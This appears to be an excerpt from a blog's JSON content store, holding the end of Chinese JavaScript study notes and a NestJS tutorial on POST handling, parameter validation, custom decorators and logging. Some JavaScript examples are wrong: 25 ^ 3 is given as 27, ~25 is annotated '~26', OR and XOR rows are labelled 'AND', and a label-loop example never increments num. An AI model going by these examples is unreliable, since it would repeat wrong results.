title=\"Boolean类型\"></a>Boolean类型</h5><table><thead><tr><th>数据类型</th><th>转换为true的值</th><th>转换位为false的值</th></tr></thead><tbody><tr><td>Boolean</td><td>true</td><td>false</td></tr><tr><td>String</td><td>任何非空字符串</td><td>“”空字符串</td></tr><tr><td>Number</td><td>任何非零数值(包括无穷大)</td><td>0和NaN</td></tr><tr><td>Object</td><td>任何对象</td><td>null</td></tr><tr><td>Undefined</td><td>不存在的</td><td>undefined</td></tr></tbody></table><h5 id=\"Number类型\"><a href=\"#Number类型\" class=\"headerlink\" title=\"Number类型\"></a>Number类型</h5><p>1、如果前缀为 0，则 JavaScript 会把数值常量解释为八进制数，如果前缀为 0 和 “x”，则解释为十六进制数。即<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var octalNum = 070 // 56</span><br><span class=\"line\">var hexNum1 = 0xA //10</span><br></pre></td></tr></table></figure><p></p><p>在进行算术运算时其右会转化成10进制<br>2、JavaScript中+0和-0是相等的<br>3、由于浮点数的数值计算产生误差，即0.1 + 0.2 = 0.30000000000000004是因为给予IEEE754数值的浮点数计算的通病(详见：计算机系统基础－－第二章(数据的机器级表示与处理) – 浮点数的表示)<br>4、由于浮点数的表示范围有限，因此其表示范围有Number.MIN_VALUE(最小值)和Number.MAX_VALUE(最大值)表示。采用isFinite()函数判断其是否溢出<br>5、NaN表示not a number 是一个特殊的值，表示其转换不是一个数值。任何数值的算术运算对NaN的结果都是NaN，且NaN不等于其本身。判断是否是NaN有专门函数isNaN()来判断。传入参数会先尝试转换成number再判断。而测试对象时先调用对象的valueOf方法，在确定是否可以转换成数值，如果不能，再调用toString方法。在测试返回值。<br>6、数值转换函数Number(),规则如下<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(1)boolean,true转换成1，false转换成0</span><br><span class=\"line\">(2)数值，简单传入和返回</span><br><span class=\"line\">(3)null，返回0</span><br><span class=\"line\">(4)undefined，返回NaN</span><br><span class=\"line\">(5)字符串：   &lt;1&gt;转换为十进制数，并且将前面多余的0去除</span><br><span class=\"line\">             &lt;2&gt;浮点数格式相同</span><br><span class=\"line\">             &lt;3&gt;如果包含0x、0o，将其转换成10进制数</span><br><span class=\"line\">             &lt;4&gt;空字符串转换为0</span><br><span class=\"line\">             &lt;5&gt;其他格式外都转换成NaN</span><br><span class=\"line\">(6)对象，先调用valueOf()方法，然后依照返回值，如果是NaN，则调用对象toString方法，再根据前面返回字符串</span><br></pre></td></tr></table></figure><p></p><p>7、parseInt()，parseFloat()函数<br>parseInt也是将传入参数转换成数值，与Number函数不同的地方是，parseInt函数会选取从首字符开始的数值，到非数值字符结束，即parseInt(‘123abc’)转换成123，而Number转换成NaN。<br>parseInt可以接受第二个参数，代表转换成的基于格式。即<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parseInt(&apos;10&apos;,2)  // 2</span><br></pre></td></tr></table></figure><p></p><p>基于格式格式转化成相应十进制数</p><h5 id=\"String类型\"><a href=\"#String类型\" class=\"headerlink\" title=\"String类型\"></a>String类型</h5><p>1、字符字面量，例如\\n(换行),\\t(制表)等等。这些字面量在字符串的任意位置都会被当做字符来解析。例如<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = &apos;\\t\\t\\t&apos;</span><br><span class=\"line\">a.length // 3</span><br></pre></td></tr></table></figure><p></p><p>而a打印出来是三个制表<br>2、字符串的特点。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var lang = &apos;Java&apos;</span><br><span class=\"line\">lang = lang + &apos;Script&apos;</span><br></pre></td></tr></table></figure><p></p><p>开始时lang保存字符串Java，而第二行把lang的值重新定义为Java和script结合，这个操作首先创建一个能容纳10个字符的新字符串，然后在这个字符串中填入java 和script，最后一步是销毁原来的字符串java和字符串script。<br>3、字符串的转换<br>利用toString方法来将数值转化成string，而其参数是转化成不同进制<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num = 11</span><br><span class=\"line\">num.toString() // &apos;11&apos;</span><br><span class=\"line\">var nums = 10</span><br><span class=\"line\">nums.toString(2) // &apos;1010&apos;</span><br></pre></td></tr></table></figure><p></p><p>在不是null和undefined的情况下，还可以调用String()函数其转换规则如下<br>1、如果值有toString方法，调用其不带参数的toString方法<br>2、如果值是null，返回’null’<br>3、如果是undefined，返回’undefined’</p><h5 id=\"Object类型\"><a href=\"#Object类型\" class=\"headerlink\" title=\"Object类型\"></a>Object类型</h5><p>可以使用 var o = new Object()或者使用var o = new Object来构造Object实例。每个Object实例都有下列属性和方法<br>1、constructor 保存着创建当前对象的函数<br>2、hasOwnProperty 用于检查给定的属性在当前实例中(而不是实例的原型中)<br>3、isPrototypeOf 用于检查传入的对象是否是当前对象的原型<br>4、propertyIsEnumerable 用于检查给定的属性是否能用for-in语句来枚举<br>5、toLocaleString 返回对象的字符串表示，该字符串与执行环境的地区对应<br>6、toString 返回对象的字符串表示<br>7、valueOf 返回对象的字符串、数值或布尔值</p><h5 id=\"位操作符\"><a href=\"#位操作符\" class=\"headerlink\" title=\"位操作符\"></a>位操作符</h5><p>1、按位非 (NOT) ~<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num1 = 25   // 二进制00000000000000000000000000011001</span><br><span class=\"line\">var num2 = ~num1// 二进制11111111111111111111111111100110</span><br><span class=\"line\">num2            // ~26</span><br></pre></td></tr></table></figure><p></p><p>2、按位与 (AND) &amp;<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var result = 25 &amp; 3</span><br><span class=\"line\">result  // 1</span><br><span class=\"line\">25 = 0000 0000 0000 0000 0000 0000 0001 1001</span><br><span class=\"line\">3 =  0000 0000 0000 0000 0000 0000 0000 0011</span><br><span class=\"line\">----------------------------------------------</span><br><span class=\"line\">AND= 0000 0000 0000 0000 0000 0000 0000 0001</span><br></pre></td></tr></table></figure><p></p><p>3、按位或 (OR) |<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var result = 25 | 3</span><br><span class=\"line\">result  // 27</span><br><span class=\"line\">25 = 0000 0000 0000 0000 0000 0000 0001 1001</span><br><span class=\"line\">3 =  0000 0000 0000 0000 0000 0000 0000 0011</span><br><span class=\"line\">----------------------------------------------</span><br><span class=\"line\">AND= 0000 0000 0000 0000 0000 0000 0001 1011</span><br></pre></td></tr></table></figure><p></p><p>4、按位异或 (XOR) ^<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var result = 25 ^ 3</span><br><span class=\"line\">result  // 27</span><br><span class=\"line\">25 = 0000 0000 0000 0000 0000 0000 0001 1001</span><br><span class=\"line\">3 =  0000 0000 0000 0000 0000 0000 0000 0011</span><br><span class=\"line\">----------------------------------------------</span><br><span class=\"line\">AND= 0000 0000 0000 0000 0000 0000 0001 1010</span><br></pre></td></tr></table></figure><p></p><p>5、 操作符<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">25**2 = 625</span><br></pre></td></tr></table></figure><p></p><p>**代表次方</p><h4 id=\"语句\"><a href=\"#语句\" class=\"headerlink\" title=\"语句\"></a>语句</h4><p>label语句结合break，continue语句<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num = 0;</span><br><span class=\"line\">outermost:</span><br><span class=\"line\">    for (var i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">        for (var j = 0; j &lt; 10; j++) &#123;</span><br><span class=\"line\">            if (i == 5 &amp;&amp; j == 5) &#123;</span><br><span class=\"line\">               break outermost</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">num // 55</span><br><span class=\"line\">var num = 0;</span><br><span class=\"line\">outermost:</span><br><span class=\"line\">    for (var i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">        for (var j = 0; j &lt; 10; j++) &#123;</span><br><span class=\"line\">            if (i == 5 &amp;&amp; j == 5) &#123;</span><br><span class=\"line\">               continue outermost</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">num // 95</span><br></pre></td></tr></table></figure><p></p><p>lable结合break，continue语句可以控制跳出位置</p><h4 id=\"with语句\"><a href=\"#with语句\" class=\"headerlink\" title=\"with语句\"></a>with语句</h4><p>将代码作用域设定到特定对象中。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var qs = location.search.substring(1)</span><br><span class=\"line\">var hostName = location.hostname</span><br><span class=\"line\">var url = location.href</span><br><span class=\"line\">//使用with语句后</span><br><span class=\"line\">with(location)&#123;</span><br><span class=\"line\">    var qs = search.substring(1)</span><br><span class=\"line\">    var hostName = hostname</span><br><span class=\"line\">    var url = href</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过本章学习，发现许多细节问题之前没有搞清楚，一直使用老方法去引用script。变量命名一直也是随意命名，今后的学习、coding之路，让我更清晰，明了基础的知识</p>"},{"title":"NestJs 入门教程之二：处理请求","date":"2021-09-12T02:06:06.000Z","dir":"nestJs","keywords":"NestJs 教程","_content":"![nestjs](nestjs.png)\n\n这个系列的{% post_link nest-js-tutorial-1 上一篇 %}文章，教大家写了 hello world 和 新建 students 模块。\n\n但是，那只是很干的 Get 请求；即没有 Post 请求，也没有给参数做检查；更没有日志的使用。\n\n本篇接着往下讲，通过 NestJs 的原生能力，来实现 Post 请求，并做参数检查，最后利用原生日志模块实现标准化日志。\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n\n# 一、Post 请求\n经过上篇的介绍，总体请求先会经过 students.controller.ts -> 再到 students.service.ts。\n\n在 students.service.ts 上新增 `Post` 方法\n```typescript\n// students.service.ts\nimport { Controller, Get, Post } from '@nestjs/common';\n\n// ...\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    // @Get('who-are-you') ...\n\n    @Post('who-are-you')\n    whoAreYouPost() {\n        return this.studentsService.ImStudent();\n    }\n}\n```\n\n通过 curl 访问地址\n```bash\n// ✅\ncurl -X POST  http://127.0.0.1:3000/students/who-are-you\n// => Im student%\n```\n\n通过替换装饰器，就可以快速实现 `Post` 请求。\n\n# 二、请求参数\n正常请求都会加上参数，`Get` 和 `Post` 方法加参数略有不同。\n\n先看 Get 请求\n\n## Get 请求参数\nGet 请求的参数一般会放在 URL 上，这是 `@Query` 装饰器就派上用场了。\n\n先改造 controller\n\n\n```typescript\n// students.controller.ts\nimport { Controller, Get, Post, Query } from '@nestjs/common';\n// ...\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    @Get('who-are-you')\n    whoAreYou(@Query('name') name: string) {\n        return this.studentsService.ImStudent(name);\n    }\n}\n```\n\n再改造 service\n\n```typescript\n// students.service.ts\nimport { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    ImStudent(name?: string) {\n        return 'Im student ' + name;\n    }\n}\n```\n\n通过浏览器访问 url\n```url\n// ✅\nhttp://localhost:3000/students/who-are-you?name=gdccwxx\n// => Im student gdccwxx\n```\n这样 Get 请求就能获取到 name 参数了\n\n## Post 参数\nPost 参数有些不同，会用到 [DTO](https://baike.baidu.com/item/DTO/16016821) 的传输。因为数据通过 HTTP 传输是文本类型，因此需要将文本类型转化成代码可识别的变量。\n\n新建 students.dto.ts\n```typescript\n// src/students/dtos/students.dto.ts\nexport class StudentDto {\n    name: string;\n}\n```\n\n编辑 students.controller.ts\n```typescript\n// students.controller.ts\nimport { Body, Controller, Get, Post, Query } from '@nestjs/common';\nimport { StudentDto } from './dtos/students.dto';\nimport { StudentsService } from './students.service';\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    // @Get('who-are-you') ...\n\n    @Post('who-are-you')\n    whoAreYouPost(@Body() student: StudentDto) {\n        return this.studentsService.ImStudent(student.name);\n    }\n}\n```\n\n命令行访问\n```\n// ✅\ncurl -X POST -d\"name=gdccwxx\"  http://127.0.0.1:3000/students/who-are-you\n// => Im student gdccwxx%\n```\n\bpost 方法传递的参数是通过请求 body 给到后台的。需要通过 `@Body` 装饰器解析 Body 中的数据。\n\n\n# 三、参数限制与转换\n这部分其实用到了 [管道](https://docs.nestjs.com/pipes) 的概念，我们用基础管道来实现，更高阶用法将会放在{% post_link nest-js-tutorial-4 第四章 %}中\n\n## Get 请求\nget 请求需要用到 `ParseIntPipe`, 更多的内置管道列表可查看[这里](https://docs.nestjs.com/pipes#built-in-pipes)\n\n浏览器访问的 url 默认是 string 类型，`ParseIntPipe` 管道能将 string 类型转化成 number 类型\n\n\n这次我们实现的是通过 id 查找学生姓名。\n\n修改 students.service.ts\n```typescript\n// students.service.ts\nimport { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    // ImStudent...\n\n    getStudentName(id: number) {\n        const ID_NAME_MAP = {\n            1: 'gdccwxx',\n        };\n\n        return ID_NAME_MAP[id] ?? 'not found';\n    }\n}\n\n```\n\n修改 students.controller.ts\n```typescript\nimport { Body, Controller, Get, Post, Query, ParseIntPipe } from '@nestjs/common';\n// ... \n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    // @Get('who-are-you') ..\n\n    // @Post('who-are-you') ...\n\n    @Get('get-name-by-id')\n    getNameById(@Query('id', ParseIntPipe) id: number) {\n        return this.studentsService.getStudentName(id);\n    }\n}\n\n```\n\n浏览器使用参数访问\n```\n// ❌\nhttp://localhost:3000/students/get-name-by-id?id=gdccwxx\n// => {\n//     statusCode: 400,\n//     message: \"Validation failed (numeric string is expected)\",\n//     error: \"Bad Request\"\n// } \n\n// ✅\nhttp://localhost:3000/students/get-name-by-id?id=1\n// => gdccwxx  \n```\n\n当使用非法请求，导致无法转换时，NestJs 会将请求报错处理，而正确参数则会转换后调用调用相应函数。通过简单的装饰器引用， NestJs 框架就可以自动做了参数检查与转换了\n\n## Post 请求\nPost 请求略微有些不一样，要用到 class-validator\n\n安装 class-validator\n```bash\nnpm i --save class-validator class-transformer\n```\n\n修改 main.ts\n```typescript\n// main.ts\nimport { NestFactory } from '@nestjs/core';\nimport { ValidationPipe } from '@nestjs/common';\nimport { AppModule } from './app.module';\n\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  app.useGlobalPipes(new ValidationPipe());\n  await app.listen(3000);\n}\nbootstrap();\n```\n\n修改 student.dto.ts\n```typescript\nimport { IsNotEmpty, IsString } from 'class-validator';\n\nexport class StudentDto {\n    @IsNotEmpty()\n    @IsString()\n    name: string;\n}\n\n```\n\n通过命令行访问\n```\n// ❌\ncurl -X POST  http://127.0.0.1:3000/students/who-are-you\n// => {\"statusCode\":400,\"message\":[\"name must be a string\",\"name should not be empty\"],\"error\":\"Bad Request\"}%\n\n// ❌\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": 1}'\n// => {\"statusCode\":400,\"message\":[\"name must be a string\"],\"error\":\"Bad Request\"}% \n\n// ✅\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": \"gdccwxx\"}'\n// => Im student gdccwxx% \n```\n\n到此，参数校验部分也就完成。\n\n# 四、自定义装饰器\n在 post 请求用到了大量的装饰器，系统装饰器能满足大部分场景，但是有些特定需求时，需要自定义装饰器。\n\n例如这样一个场景：每个请求都会带上 `user` 字段。代表是谁做的请求，每次在代码里 getUser 是非常难受的事情，这时自定义装饰器就派上了用场。\n\n新建 src/common/decorators.ts\n```typescript\n// src/common/decorators.ts\nimport { createParamDecorator, ExecutionContext } from '@nestjs/common';\n\nexport const User = createParamDecorator(\n  (data: unknown, ctx: ExecutionContext) => {\n    const request = ctx.switchToHttp().getRequest(); // 拿到请求\n    return request.body.user;\n  },\n);\n```\n\n修改 students.controller.ts\n```typescript\nimport { Body, Controller, Get, Post, Query, ParseIntPipe } from '@nestjs/common';\nimport { StudentsService } from './students.service';\nimport { User } from '../common/decorators';\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n    // @Get('who-are-you') ...\n    // @Post('who-are-you') ...\n    // @Get('get-name-by-id')...\n\n    @Post('who-is-request')\n    whoIsReq(@User() user: string) {\n        return user;\n    }\n}\n\n```\n\n命令行访问\n```bash\n// ✅\ncurl -X POST http://127.0.0.1:3000/students/who-is-request -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx\"}'\n// => gdccwxx% \n```\n\n通过自定义装饰器，并将其挂在函数上，代码就能优雅的获取是谁请求的借口。\n\n# 五、日志\n后台接口请求常伴随日志产生，日志对后台查问题至关重要。NestJs 框架也集成了日志，开箱即用。\n\n使用日志分为三步:\n- main.ts 引入 `Logger`\n- 模块引入日志组建: `private readonly logger = new Logger(StudentsService.name)`;\n- 在需要打印的地方引入: this.logger.log(\\`student name is ${name}\\`);\n\n\n修改main.ts\n```typescript\n// main.ts\nimport { NestFactory } from '@nestjs/core';\nimport { ValidationPipe, Logger } from '@nestjs/common';\nimport { AppModule } from './app.module';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule, {\n    logger: new Logger(),\n  });\n  // ...\n}\n// ...\n```\n\n引用 Logger 组建\n```ts\nimport { Injectable, Logger } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    private readonly logger = new Logger(StudentsService.name);\n\n    ImStudent(name?: string) {\n        this.logger.log(`student name is ${name}`);\n        return 'Im student ' + name;\n    }\n\n    getStudentName(id: number) {\n        this.logger.log(`get student id is ${id}`);\n        const ID_NAME_MAP = {\n            1: 'gdccwxx',\n        };\n\n        return ID_NAME_MAP[id] ?? 'not found';\n    }\n}\n```\n\n访问接口，控制台输出\n```\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": \"gdccwxx\"}'\n```\n![logger](log.png)\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n处理请求的基本方法就讲到这里，{% post_link nest-js-tutorial-3 下一篇 %}会讲解如何连接数据库并使用\n","source":"_posts/nest-js-tutorial-2.md","raw":"---\ntitle: NestJs 入门教程之二：处理请求\ndate: 2021-09-12 10:06:06\ntags:\n    - javascript\n    - typescript\n    - nestJs\ndir: nestJs\nkeywords: NestJs 教程\n---\n![nestjs](nestjs.png)\n\n这个系列的{% post_link nest-js-tutorial-1 上一篇 %}文章，教大家写了 hello world 和 新建 students 模块。\n\n但是，那只是很干的 Get 请求；即没有 Post 请求，也没有给参数做检查；更没有日志的使用。\n\n本篇接着往下讲，通过 NestJs 的原生能力，来实现 Post 请求，并做参数检查，最后利用原生日志模块实现标准化日志。\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n\n# 一、Post 请求\n经过上篇的介绍，总体请求先会经过 students.controller.ts -> 再到 students.service.ts。\n\n在 students.service.ts 上新增 `Post` 方法\n```typescript\n// students.service.ts\nimport { Controller, Get, Post } from '@nestjs/common';\n\n// ...\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    // @Get('who-are-you') ...\n\n    @Post('who-are-you')\n    whoAreYouPost() {\n        return this.studentsService.ImStudent();\n    }\n}\n```\n\n通过 curl 访问地址\n```bash\n// ✅\ncurl -X POST  http://127.0.0.1:3000/students/who-are-you\n// => Im student%\n```\n\n通过替换装饰器，就可以快速实现 `Post` 请求。\n\n# 二、请求参数\n正常请求都会加上参数，`Get` 和 `Post` 方法加参数略有不同。\n\n先看 Get 请求\n\n## Get 请求参数\nGet 请求的参数一般会放在 URL 上，这是 `@Query` 装饰器就派上用场了。\n\n先改造 controller\n\n\n```typescript\n// students.controller.ts\nimport { Controller, Get, Post, Query } from '@nestjs/common';\n// ...\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    @Get('who-are-you')\n    whoAreYou(@Query('name') name: string) {\n        return this.studentsService.ImStudent(name);\n    }\n}\n```\n\n再改造 service\n\n```typescript\n// students.service.ts\nimport { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    ImStudent(name?: string) {\n        return 'Im student ' + name;\n    }\n}\n```\n\n通过浏览器访问 url\n```url\n// ✅\nhttp://localhost:3000/students/who-are-you?name=gdccwxx\n// => Im student gdccwxx\n```\n这样 Get 请求就能获取到 name 参数了\n\n## Post 参数\nPost 参数有些不同，会用到 [DTO](https://baike.baidu.com/item/DTO/16016821) 的传输。因为数据通过 HTTP 传输是文本类型，因此需要将文本类型转化成代码可识别的变量。\n\n新建 students.dto.ts\n```typescript\n// src/students/dtos/students.dto.ts\nexport class StudentDto {\n    name: string;\n}\n```\n\n编辑 students.controller.ts\n```typescript\n// students.controller.ts\nimport { Body, Controller, Get, Post, Query } from '@nestjs/common';\nimport { StudentDto } from './dtos/students.dto';\nimport { StudentsService } from './students.service';\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    // @Get('who-are-you') ...\n\n    @Post('who-are-you')\n    whoAreYouPost(@Body() student: StudentDto) {\n        return this.studentsService.ImStudent(student.name);\n    }\n}\n```\n\n命令行访问\n```\n// ✅\ncurl -X POST -d\"name=gdccwxx\"  http://127.0.0.1:3000/students/who-are-you\n// => Im student gdccwxx%\n```\n\bpost 方法传递的参数是通过请求 body 给到后台的。需要通过 `@Body` 装饰器解析 Body 中的数据。\n\n\n# 三、参数限制与转换\n这部分其实用到了 [管道](https://docs.nestjs.com/pipes) 的概念，我们用基础管道来实现，更高阶用法将会放在{% post_link nest-js-tutorial-4 第四章 %}中\n\n## Get 请求\nget 请求需要用到 `ParseIntPipe`, 更多的内置管道列表可查看[这里](https://docs.nestjs.com/pipes#built-in-pipes)\n\n浏览器访问的 url 默认是 string 类型，`ParseIntPipe` 管道能将 string 类型转化成 number 类型\n\n\n这次我们实现的是通过 id 查找学生姓名。\n\n修改 students.service.ts\n```typescript\n// students.service.ts\nimport { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    // ImStudent...\n\n    getStudentName(id: number) {\n        const ID_NAME_MAP = {\n            1: 'gdccwxx',\n        };\n\n        return ID_NAME_MAP[id] ?? 'not found';\n    }\n}\n\n```\n\n修改 students.controller.ts\n```typescript\nimport { Body, Controller, Get, Post, Query, ParseIntPipe } from '@nestjs/common';\n// ... \n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    // @Get('who-are-you') ..\n\n    // @Post('who-are-you') ...\n\n    @Get('get-name-by-id')\n    getNameById(@Query('id', ParseIntPipe) id: number) {\n        return this.studentsService.getStudentName(id);\n    }\n}\n\n```\n\n浏览器使用参数访问\n```\n// ❌\nhttp://localhost:3000/students/get-name-by-id?id=gdccwxx\n// => {\n//     statusCode: 400,\n//     message: \"Validation failed (numeric string is expected)\",\n//     error: \"Bad Request\"\n// } \n\n// ✅\nhttp://localhost:3000/students/get-name-by-id?id=1\n// => gdccwxx  \n```\n\n当使用非法请求，导致无法转换时，NestJs 会将请求报错处理，而正确参数则会转换后调用调用相应函数。通过简单的装饰器引用， NestJs 框架就可以自动做了参数检查与转换了\n\n## Post 请求\nPost 请求略微有些不一样，要用到 class-validator\n\n安装 class-validator\n```bash\nnpm i --save class-validator class-transformer\n```\n\n修改 main.ts\n```typescript\n// main.ts\nimport { NestFactory } from '@nestjs/core';\nimport { ValidationPipe } from '@nestjs/common';\nimport { AppModule } from './app.module';\n\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  app.useGlobalPipes(new ValidationPipe());\n  await app.listen(3000);\n}\nbootstrap();\n```\n\n修改 student.dto.ts\n```typescript\nimport { IsNotEmpty, IsString } from 'class-validator';\n\nexport class StudentDto {\n    @IsNotEmpty()\n    @IsString()\n    name: string;\n}\n\n```\n\n通过命令行访问\n```\n// ❌\ncurl -X POST  http://127.0.0.1:3000/students/who-are-you\n// => {\"statusCode\":400,\"message\":[\"name must be a string\",\"name should not be empty\"],\"error\":\"Bad Request\"}%\n\n// ❌\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": 1}'\n// => {\"statusCode\":400,\"message\":[\"name must be a string\"],\"error\":\"Bad Request\"}% \n\n// ✅\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": \"gdccwxx\"}'\n// => Im student gdccwxx% \n```\n\n到此，参数校验部分也就完成。\n\n# 四、自定义装饰器\n在 post 请求用到了大量的装饰器，系统装饰器能满足大部分场景，但是有些特定需求时，需要自定义装饰器。\n\n例如这样一个场景：每个请求都会带上 `user` 字段。代表是谁做的请求，每次在代码里 getUser 是非常难受的事情，这时自定义装饰器就派上了用场。\n\n新建 src/common/decorators.ts\n```typescript\n// src/common/decorators.ts\nimport { createParamDecorator, ExecutionContext } from '@nestjs/common';\n\nexport const User = createParamDecorator(\n  (data: unknown, ctx: ExecutionContext) => {\n    const request = ctx.switchToHttp().getRequest(); // 拿到请求\n    return request.body.user;\n  },\n);\n```\n\n修改 students.controller.ts\n```typescript\nimport { Body, Controller, Get, Post, Query, ParseIntPipe } from '@nestjs/common';\nimport { StudentsService } from './students.service';\nimport { User } from '../common/decorators';\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n    // @Get('who-are-you') ...\n    // @Post('who-are-you') ...\n    // @Get('get-name-by-id')...\n\n    @Post('who-is-request')\n    whoIsReq(@User() user: string) {\n        return user;\n    }\n}\n\n```\n\n命令行访问\n```bash\n// ✅\ncurl -X POST http://127.0.0.1:3000/students/who-is-request -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx\"}'\n// => gdccwxx% \n```\n\n通过自定义装饰器，并将其挂在函数上，代码就能优雅的获取是谁请求的借口。\n\n# 五、日志\n后台接口请求常伴随日志产生，日志对后台查问题至关重要。NestJs 框架也集成了日志，开箱即用。\n\n使用日志分为三步:\n- main.ts 引入 `Logger`\n- 模块引入日志组建: `private readonly logger = new Logger(StudentsService.name)`;\n- 在需要打印的地方引入: this.logger.log(\\`student name is ${name}\\`);\n\n\n修改main.ts\n```typescript\n// main.ts\nimport { NestFactory } from '@nestjs/core';\nimport { ValidationPipe, Logger } from '@nestjs/common';\nimport { AppModule } from './app.module';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule, {\n    logger: new Logger(),\n  });\n  // ...\n}\n// ...\n```\n\n引用 Logger 组建\n```ts\nimport { Injectable, Logger } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    private readonly logger = new Logger(StudentsService.name);\n\n    ImStudent(name?: string) {\n        this.logger.log(`student name is ${name}`);\n        return 'Im student ' + name;\n    }\n\n    getStudentName(id: number) {\n        this.logger.log(`get student id is ${id}`);\n        const 